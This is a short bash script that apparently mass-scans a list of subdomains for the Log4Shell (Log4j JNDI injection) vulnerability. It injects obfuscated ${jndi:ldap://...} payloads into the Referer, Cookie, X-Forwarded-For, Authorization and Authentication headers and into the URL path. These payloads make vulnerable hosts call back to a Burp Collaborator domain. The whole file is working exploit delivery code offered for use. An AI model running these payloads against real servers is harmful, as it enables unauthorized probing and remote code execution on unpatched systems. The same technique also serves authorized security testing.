#!/bin/bash
while read -r subdomain; do
	collaborator=$(date +%s).w63i8gz0m984niziq3kzlvk4mvstgi.burpcollaborator.net
	payload="\${jn\${lower:d}i:ldap://127.0.0.1#$collaborator:1389/a}"
	urlPayload="\${jn\${lower:d}i:ldap://127.0.0.1%23$collaborator:1389/a}"

	echo $subdomain | httpx -title -follow-redirects -status-code -tech-detect -silent -timeout 3 -H "Referer: $payload" -path "/$urlPayload" -H "Cookie: $payload=$payload" -http-proxy http://localhost:4321
	echo $subdomain | httpx -title -follow-redirects -status-code -tech-detect -silent -timeout 3 -H "Referer: $payload" -H "Cookie: $payload=$payload" -http-proxy http://localhost:4321
	echo $subdomain | httpx -title -follow-redirects -status-code -tech-detect -silent -timeout 3 -H "X-forwared-for: $payload" -http-proxy http://localhost:4321
	echo $subdomain | httpx -title -follow-redirects -status-code -tech-detect -silent -timeout 3 -H "Authentication: $payload" -http-proxy http://localhost:4321
	echo $subdomain | httpx -title -follow-redirects -status-code -tech-detect -silent -timeout 3 -H "Authorization: $payload" -http-proxy http://localhost:4321

done < $1